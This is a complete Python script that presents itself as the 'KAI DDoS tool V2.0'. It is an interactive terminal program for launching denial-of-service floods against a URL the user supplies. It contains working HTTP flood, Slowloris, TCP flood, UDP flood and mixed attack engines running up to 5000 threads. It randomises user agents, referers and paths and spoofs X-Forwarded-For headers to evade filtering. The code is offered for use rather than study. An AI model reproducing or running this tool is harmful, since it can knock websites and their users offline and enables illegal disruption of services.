#!/usr/bin/env python3

import os
import sys
import json
import time
import random
import string
import threading
import socket
import ssl
import itertools
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system("pip install requests -q")
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama -q")
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

# ========== CONFIGURATION ==========
CONFIG = {
    "threads": 500,
    "timeout": 5,
    "duration": 0,          # 0 = unlimited
    "attack_mode": "http",  # http, slowloris, tcp, udp, mixed
    "proxy_file": None,
    "use_ssl": False,
    "random_uri": True,
    "verbose": True,
    "stats_interval": 2,    # seconds between stats updates
    "max_workers": 50,      # for thread pool executor
}

# ========== STATISTICS ==========
stats = {
    "sent": 0,
    "failed": 0,
    "start_time": None,
    "running": False,
    "bps": 0,
    "latency_samples": [],
}

lock = threading.Lock()
stop_event = threading.Event()

# ========== USER AGENTS & REFERERS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/15.15221",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://news.ycombinator.com/",
    "https://stackoverflow.com/",
    "https://github.com/",
    "https://en.wikipedia.org/",
]

# ========== GUI ==========
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════╗
{Fore.RED}║{Fore.YELLOW}   ██ ▄█▀▄▄▄       ██▓                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}   ██▄█▒▒████▄    ▓██▒                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ▓███▄░▒██  ▀█▄  ▒██▒                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ▓██ █▄░██▄▄▄▄██ ░██░                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ▒██▒ █▄▓█   ▓██▒░██░                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ▒ ▒▒ ▓▒▒▒   ▓▒█░░▓                                  {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ░ ░▒ ▒░ ▒   ▒▒ ░ ▒ ░                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ░ ░░ ░  ░   ▒    ▒ ░                                {Fore.RED}║
{Fore.RED}║{Fore.YELLOW}  ░  ░        ░  ░ ░                                  {Fore.RED}║
{Fore.RED}╠══════════════════════════════════════════════════════╣
{Fore.RED}║{Fore.CYAN}  ⚡ ᴋᴀɪ ᴅᴅᴏꜱ ᴛᴏᴏʟ V2.0                               {Fore.RED}║
{Fore.RED}║{Fore.CYAN}  🎯 ʙᴇꜱᴛ ᴅᴅᴏꜱ ᴛᴏᴏʟ                                   {Fore.RED}║
{Fore.RED}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def print_status():
    """Live status display"""
    elapsed = 0
    if stats["start_time"]:
        elapsed = int(time.time() - stats["start_time"])
    
    rate = 0
    if elapsed > 0:
        rate = stats["sent"] / elapsed
    
    success_rate = 0
    total = stats["sent"] + stats["failed"]
    if total > 0:
        success_rate = (stats["sent"] / total) * 100

    status = f"""
{Fore.CYAN}┌─────────────────────────────────────────────────────┐
{Fore.CYAN}│{Fore.GREEN}  📊 LIVE STATISTICS                      {Fore.CYAN}         
{Fore.CYAN}├─────────────────────────────────────────────────────┤
{Fore.CYAN}│{Fore.WHITE}  🚀 Requests Sent:   {Fore.YELLOW}{stats['sent']:<12}{Fore.CYAN}              
{Fore.CYAN}│{Fore.WHITE}  ❌ Failed:           {Fore.RED}{stats['failed']:<12}{Fore.CYAN}              
{Fore.CYAN}│{Fore.WHITE}  📈 Success Rate:    {Fore.GREEN if success_rate > 80 else Fore.YELLOW}{success_rate:>6.2f}%{Fore.CYAN}               
{Fore.CYAN}│{Fore.WHITE}  ⚡ Rate:             {Fore.MAGENTA}{rate:>8.2f} req/s{Fore.CYAN}               
{Fore.CYAN}│{Fore.WHITE}  ⏱️  Elapsed:         {Fore.CYAN}{elapsed:>6}s{Fore.CYAN}                  
{Fore.CYAN}│{Fore.WHITE}  🎯 Mode:            {Fore.YELLOW}{CONFIG['attack_mode'].upper():<12}{Fore.CYAN}              
{Fore.CYAN}│{Fore.WHITE}  🧵 Threads:         {Fore.CYAN}{CONFIG['threads']:<12}{Fore.CYAN}              
{Fore.CYAN}└─────────────────────────────────────────────────────┘{Style.RESET_ALL}
"""
    sys.stdout.write("\033[2J\033[H")  # clear screen, home cursor
    print_banner()
    print(status)
    sys.stdout.flush()

def print_menu():
    menu = f"""
{Fore.CYAN}┌─────────────────────────────────────────────────────┐
{Fore.CYAN}│{Fore.GREEN}  🛠️  CONFIGURATION {Fore.CYAN}         
{Fore.CYAN}├─────────────────────────────────────────────────────┤
{Fore.CYAN}│                                                     
{Fore.CYAN}│  {Fore.WHITE}[1]{Fore.YELLOW} Target URL           : {Fore.GREEN}{CONFIG.get('target','Not Set'):<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[2]{Fore.YELLOW} Threads ({Fore.CYAN}1-5000{Fore.YELLOW})     : {Fore.GREEN}{CONFIG['threads']:<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[3]{Fore.YELLOW} Duration (seconds)   : {Fore.GREEN}{'Unlimited' if CONFIG['duration']==0 else CONFIG['duration']:<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[4]{Fore.YELLOW} Attack Mode          : {Fore.GREEN}{CONFIG['attack_mode'].upper():<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[5]{Fore.YELLOW} Timeout (seconds)    : {Fore.GREEN}{CONFIG['timeout']:<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[6]{Fore.YELLOW} Random URI Paths     : {Fore.GREEN}{'ON' if CONFIG['random_uri'] else 'OFF':<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[7]{Fore.YELLOW} SSL/TLS              : {Fore.GREEN}{'ON' if CONFIG['use_ssl'] else 'OFF':<30}{Fore.CYAN}
{Fore.CYAN}│  {Fore.WHITE}[8]{Fore.YELLOW} Verbose Output       : {Fore.GREEN}{'ON' if CONFIG['verbose'] else 'OFF':<30}{Fore.CYAN}
{Fore.CYAN}│                                                     
{Fore.CYAN}│  {Fore.GREEN}[S] START ATTACK                         {Fore.CYAN}
{Fore.CYAN}│  {Fore.RED}[X] EXIT                                   {Fore.CYAN}
{Fore.CYAN}└─────────────────────────────────────────────────────┘{Style.RESET_ALL}
"""
    print(menu)

# ========== ATTACK ENGINES ==========
def gen_random_str(min_len=3, max_len=15):
    length = random.randint(min_len, max_len)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def gen_random_path():
    depth = random.randint(1, 4)
    parts = [gen_random_str(3, 8) for _ in range(depth)]
    return '/' + '/'.join(parts) + ('?' + gen_random_str(5, 12) + '=' + gen_random_str(5, 12) if random.random() > 0.5 else '')

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }

def http_flood_worker(target_url, parsed):
    """HTTP/HTTPS flood using requests with connection reuse"""
    try:
        session = requests.Session()
        retries = Retry(total=0, backoff_factor=0)
        adapter = HTTPAdapter(max_retries=retries, pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while not stop_event.is_set():
            try:
                url = target_url
                if CONFIG["random_uri"]:
                    url = f"{parsed.scheme}://{parsed.netloc}{gen_random_path()}"
                
                headers = get_headers()
                
                # Randomly switch between GET and POST
                if random.random() > 0.7:
                    r = session.post(url, headers=headers, timeout=CONFIG["timeout"], 
                                     data={"data": gen_random_str(10, 50)})
                else:
                    r = session.get(url, headers=headers, timeout=CONFIG["timeout"])
                
                with lock:
                    stats["sent"] += 1
                    stats["latency_samples"].append(r.elapsed.total_seconds())
                    if len(stats["latency_samples"]) > 1000:
                        stats["latency_samples"] = stats["latency_samples"][-500:]
                
            except Exception:
                with lock:
                    stats["failed"] += 1
                
    except Exception:
        pass

def slowloris_worker(host, port, use_ssl):
    """Slowloris - sends partial HTTP headers slowly to hold connections open"""
    try:
        while not stop_event.is_set():
            try:
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(CONFIG["timeout"])
                sock.connect((host, port))
                
                # Send partial HTTP request
                sock.send(f"GET /?{gen_random_str(5,15)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {host}\r\n".encode())
                sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                
                # Keep sending headers slowly to hold connection
                for _ in range(20):
                    if stop_event.is_set():
                        break
                    sock.send(f"X-{gen_random_str(8,20)}: {gen_random_str(8,30)}\r\n".encode())
                    time.sleep(random.uniform(5, 15))
                
                sock.send("\r\n".encode())
                sock.close()
                
                with lock:
                    stats["sent"] += 1
                    
            except Exception:
                with lock:
                    stats["failed"] += 1
                time.sleep(1)
    except Exception:
        pass

def tcp_flood_worker(host, port):
    """Raw TCP flood - opens connections and sends random data"""
    try:
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(CONFIG["timeout"])
                sock.connect((host, port))
                sock.send(os.urandom(random.randint(64, 1460)))
                sock.close()
                
                with lock:
                    stats["sent"] += 1
            except Exception:
                with lock:
                    stats["failed"] += 1
    except Exception:
        pass

def udp_flood_worker(host, port):
    """UDP flood - stateless, fast"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_event.is_set():
            try:
                sock.sendto(os.urandom(random.randint(64, 1460)), (host, port))
                with lock:
                    stats["sent"] += 1
            except Exception:
                with lock:
                    stats["failed"] += 1
    except Exception:
        pass

def mixed_worker(target_url, parsed, host, port):
    """Mix of HTTP, slow requests, and connection saturation"""
    mode_selector = random.choice(["http", "slow", "tcp"])
    
    if mode_selector == "http":
        http_flood_worker(target_url, parsed)
    elif mode_selector == "slow":
        slowloris_worker(host, port if port else 80, CONFIG["use_ssl"])
    else:
        tcp_flood_worker(host, port if port else 80)

# ========== STATS DISPLAY THREAD ==========
def stats_display():
    while not stop_event.is_set():
        print_status()
        stop_event.wait(CONFIG["stats_interval"])

# ========== MAIN ATTACK CONTROLLER ==========
def start_attack(target_url):
    """Initialize and launch the stress test"""
    
    # Parse URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    
    CONFIG["target"] = target_url
    stats["start_time"] = time.time()
    stats["sent"] = 0
    stats["failed"] = 0
    stop_event.clear()
    
    print_status()
    print(f"{Fore.GREEN}[+] Launching attack on {Fore.YELLOW}{target_url}")
    print(f"{Fore.GREEN}[+] Mode: {Fore.YELLOW}{CONFIG['attack_mode'].upper()}")
    print(f"{Fore.GREEN}[+] Workers: {Fore.YELLOW}{CONFIG['threads']}")
    print(f"{Fore.GREEN}[+] Press {Fore.RED}CTRL+C{Fore.GREEN} to stop.{Style.RESET_ALL}")
    
    workers = []
    
    # Start stats display thread
    stats_thread = threading.Thread(target=stats_display, daemon=True)
    stats_thread.start()
    
    try:
        # Launch worker threads based on mode
        if CONFIG["attack_mode"] == "http":
            for _ in range(CONFIG["threads"]):
                t = threading.Thread(target=http_flood_worker, args=(target_url, parsed), daemon=True)
                t.start()
                workers.append(t)
                
        elif CONFIG["attack_mode"] == "slowloris":
            for _ in range(CONFIG["threads"]):
                t = threading.Thread(target=slowloris_worker, args=(host, port, CONFIG["use_ssl"]), daemon=True)
                t.start()
                workers.append(t)
                
        elif CONFIG["attack_mode"] == "tcp":
            for _ in range(CONFIG["threads"]):
                t = threading.Thread(target=tcp_flood_worker, args=(host, port), daemon=True)
                t.start()
                workers.append(t)
                
        elif CONFIG["attack_mode"] == "udp":
            for _ in range(CONFIG["threads"]):
                t = threading.Thread(target=udp_flood_worker, args=(host, port), daemon=True)
                t.start()
                workers.append(t)
                
        elif CONFIG["attack_mode"] == "mixed":
            for _ in range(CONFIG["threads"]):
                t = threading.Thread(target=mixed_worker, args=(target_url, parsed, host, port), daemon=True)
                t.start()
                workers.append(t)
        
        # If duration set, run for that long
        if CONFIG["duration"] > 0:
            stop_event.wait(CONFIG["duration"])
            stop_event.set()
        else:
            # Run until interrupted
            while not stop_event.is_set():
                stop_event.wait(1)
                
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        stop_event.set()
        time.sleep(0.5)
        
        elapsed = time.time() - stats["start_time"]
        total = stats["sent"] + stats["failed"]
        
        print(f"\n{Fore.CYAN}═══════════════ FINAL STATISTICS ═══════════════")
        print(f"{Fore.WHITE}  Duration:     {Fore.YELLOW}{elapsed:.2f}s")
        print(f"{Fore.WHITE}  Total:        {Fore.YELLOW}{total}")
        print(f"{Fore.WHITE}  Successful:   {Fore.GREEN}{stats['sent']}")
        print(f"{Fore.WHITE}  Failed:       {Fore.RED}{stats['failed']}")
        if elapsed > 0:
            print(f"{Fore.WHITE}  Avg Rate:     {Fore.MAGENTA}{stats['sent']/elapsed:.2f} req/s")
        print(f"{Fore.CYAN}═══════════════════════════════════════════════{Style.RESET_ALL}")

# ========== MAIN MENU ==========
def main():
    clear_screen()
    print_banner()
    
    while True:
        print_menu()
        
        choice = input(f"{Fore.GREEN} Kai> {Style.RESET_ALL}").strip().upper()
        
        if choice == "1":
            url = input(f"{Fore.YELLOW}  Enter target URL: {Style.RESET_ALL}").strip()
            if url:
                CONFIG["target"] = url
                print(f"{Fore.GREEN}  ✓ Target set to: {url}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "2":
            try:
                val = int(input(f"{Fore.YELLOW}  Enter thread count (1-5000): {Style.RESET_ALL}"))
                CONFIG["threads"] = max(1, min(5000, val))
                print(f"{Fore.GREEN}  ✓ Threads set to: {CONFIG['threads']}{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}  ✗ Invalid number{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "3":
            try:
                val = int(input(f"{Fore.YELLOW}  Enter duration in seconds (0=unlimited): {Style.RESET_ALL}"))
                CONFIG["duration"] = max(0, val)
                print(f"{Fore.GREEN}  ✓ Duration set to: {CONFIG['duration']}s{' (Unlimited)' if CONFIG['duration']==0 else ''}{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}  ✗ Invalid number{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "4":
            print(f"{Fore.CYAN}  Available modes: HTTP | SLOWLORIS | TCP | UDP | MIXED{Style.RESET_ALL}")
            mode = input(f"{Fore.YELLOW}  Enter attack mode: {Style.RESET_ALL}").strip().lower()
            valid_modes = ["http", "slowloris", "tcp", "udp", "mixed"]
            if mode in valid_modes:
                CONFIG["attack_mode"] = mode
                print(f"{Fore.GREEN}  ✓ Mode set to: {mode.upper()}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}  ✗ Invalid mode. Using: {CONFIG['attack_mode']}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "5":
            try:
                val = float(input(f"{Fore.YELLOW}  Enter timeout in seconds (0.1-60): {Style.RESET_ALL}"))
                CONFIG["timeout"] = max(0.1, min(60, val))
                print(f"{Fore.GREEN}  ✓ Timeout set to: {CONFIG['timeout']}s{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}  ✗ Invalid number{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "6":
            CONFIG["random_uri"] = not CONFIG["random_uri"]
            print(f"{Fore.GREEN}  ✓ Random URI: {'ON' if CONFIG['random_uri'] else 'OFF'}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "7":
            CONFIG["use_ssl"] = not CONFIG["use_ssl"]
            print(f"{Fore.GREEN}  ✓ SSL/TLS: {'ON' if CONFIG['use_ssl'] else 'OFF'}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "8":
            CONFIG["verbose"] = not CONFIG["verbose"]
            print(f"{Fore.GREEN}  ✓ Verbose: {'ON' if CONFIG['verbose'] else 'OFF'}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "S":
            if "target" not in CONFIG or not CONFIG.get("target"):
                print(f"{Fore.RED}  ✗ Please set a target URL first (option 1){Style.RESET_ALL}")
                input(f"{Fore.CYAN}  Press Enter to continue...{Style.RESET_ALL}")
            else:
                start_attack(CONFIG["target"])
                input(f"\n{Fore.CYAN}  Press Enter to return to menu...{Style.RESET_ALL}")
                
        elif choice == "X":
            print(f"{Fore.RED}  Exiting Kai. Stay sharp.{Style.RESET_ALL}")
            sys.exit(0)
            
        clear_screen()
        print_banner()

if __name__ == "__main__":
    main()